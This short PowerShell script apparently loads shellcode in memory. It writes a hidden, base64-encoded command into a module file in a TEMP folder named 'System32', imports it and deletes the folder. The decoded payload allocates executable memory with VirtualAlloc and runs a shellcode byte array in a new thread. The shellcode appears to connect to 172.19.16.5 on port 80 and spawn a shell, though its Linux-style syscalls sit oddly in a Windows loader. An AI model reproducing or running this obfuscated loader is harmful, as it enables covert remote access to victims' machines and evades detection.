$command = 'powershell -nop -w hidden -noni -enc "JABnAGwASwBjAFoAagBjAEMAVQAgAD0AIABAACIACgBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwAQQBsAGwAbwBjAGEAdABpAG8AbgBUAHkAcABlACwAIAB1AGkAbgB0ACAAZgBsAFAAcgBvAHQAZQBjAHQAKQA7AAoAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsACgAiAEAACgAKACQAVgBwAFIARwBIAEEAWgB1AFkAIAA9ACAAQQBkAGQALQBUAHkAcABlACAALQBtAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABnAGwASwBjAFoAagBjAEMAVQAgAC0ATgBhAG0AZQAgACIAVwBpAG4AMwAyACIAIAAtAG4AYQBtAGUAcwBwAGEAYwBlACAAVwBpAG4AMwAyAEYAdQBuAGMAdABpAG8AbgBzACAALQBwAGEAcwBzAHQAaAByAHUACgAKAFsAQgB5AHQAZQBbAF0AXQAgACQAdgBnAEoAaABOAFIAUgBEAHEARABPACAAPQAgADAAeAA0ADgALAAwAHgAMwAxACwAMAB4AGYAZgAsADAAeAA2AGEALAAwAHgAOQAsADAAeAA1ADgALAAwAHgAOQA5ACwAMAB4AGIANgAsADAAeAAxADAALAAwAHgANAA4ACwAMAB4ADgAOQAsADAAeABkADYALAAwAHgANABkACwAMAB4ADMAMQAsADAAeABjADkALAAwAHgANgBhACwAMAB4ADIAMgAsADAAeAA0ADEALAAwAHgANQBhACwAMAB4AGIAMgAsADAAeAA3ACwAMAB4AGYALAAwAHgANQAsADAAeAA0ADgALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADgALAAwAHgANQAxACwAMAB4ADYAYQAsADAAeABhACwAMAB4ADQAMQAsADAAeAA1ADkALAAwAHgANQAwACwAMAB4ADYAYQAsADAAeAAyADkALAAwAHgANQA4ACwAMAB4ADkAOQAsADAAeAA2AGEALAAwAHgAMgAsADAAeAA1AGYALAAwAHgANgBhACwAMAB4ADEALAAwAHgANQBlACwAMAB4AGYALAAwAHgANQAsADAAeAA0ADgALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADgALAAwAHgAMwBiACwAMAB4ADQAOAAsADAAeAA5ADcALAAwAHgANAA4ACwAMAB4AGIAOQAsADAAeAAyACwAMAB4ADAALAAwAHgAMAAsADAAeAA1ADAALAAwAHgAYQBjACwAMAB4ADEAMwAsADAAeAAxADAALAAwAHgANQAsADAAeAA1ADEALAAwAHgANAA4ACwAMAB4ADgAOQAsADAAeABlADYALAAwAHgANgBhACwAMAB4ADEAMAAsADAAeAA1AGEALAAwAHgANgBhACwAMAB4ADIAYQAsADAAeAA1ADgALAAwAHgAZgAsADAAeAA1ACwAMAB4ADUAOQAsADAAeAA0ADgALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADkALAAwAHgAMgA1ACwAMAB4ADQAOQAsADAAeABmAGYALAAwAHgAYwA5ACwAMAB4ADcANAAsADAAeAAxADgALAAwAHgANQA3ACwAMAB4ADYAYQAsADAAeAAyADMALAAwAHgANQA4ACwAMAB4ADYAYQAsADAAeAAwACwAMAB4ADYAYQAsADAAeAA1ACwAMAB4ADQAOAAsADAAeAA4ADkALAAwAHgAZQA3ACwAMAB4ADQAOAAsADAAeAAzADEALAAwAHgAZgA2ACwAMAB4AGYALAAwAHgANQAsADAAeAA1ADkALAAwAHgANQA5ACwAMAB4ADUAZgAsADAAeAA0ADgALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADkALAAwAHgAYwA3ACwAMAB4ADYAYQAsADAAeAAzAGMALAAwAHgANQA4ACwAMAB4ADYAYQAsADAAeAAxACwAMAB4ADUAZgAsADAAeABmACwAMAB4ADUALAAwAHgANQBlACwAMAB4ADYAYQAsADAAeAA3AGUALAAwAHgANQBhACwAMAB4AGYALAAwAHgANQAsADAAeAA0ADgALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADgALAAwAHgAZQBkACwAMAB4AGYAZgAsADAAeABlADYACgAKAAoAJAB6AFEAbABVAEcAagBnAGYAbwBIAFcATQBWACAAPQAgACQAVgBwAFIARwBIAEEAWgB1AFkAOgA6AFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgAMAAsAFsATQBhAHQAaABdADoAOgBNAGEAeAAoACQAdgBnAEoAaABOAFIAUgBEAHEARABPAC4ATABlAG4AZwB0AGgALAAwAHgAMQAwADAAMAApACwAMAB4ADMAMAAwADAALAAwAHgANAAwACkACgAKAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAHYAZwBKAGgATgBSAFIARABxAEQATwAsADAALAAkAHoAUQBsAFUARwBqAGcAZgBvAEgAVwBNAFYALAAkAHYAZwBKAGgATgBSAFIARABxAEQATwAuAEwAZQBuAGcAdABoACkACgAKACQAVgBwAFIARwBIAEEAWgB1AFkAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAHoAUQBsAFUARwBqAGcAZgBvAEgAVwBNAFYALAAwACwAMAAsADAAKQAKAA=="'

mkdir $env:TEMP\System32
$command | Out-File $env:TEMP\System32\thing.psm1
Import-Module $env:TEMP\System32\thing.psm1 -Force
Remove-Item -Recurse $env:TEMP\System32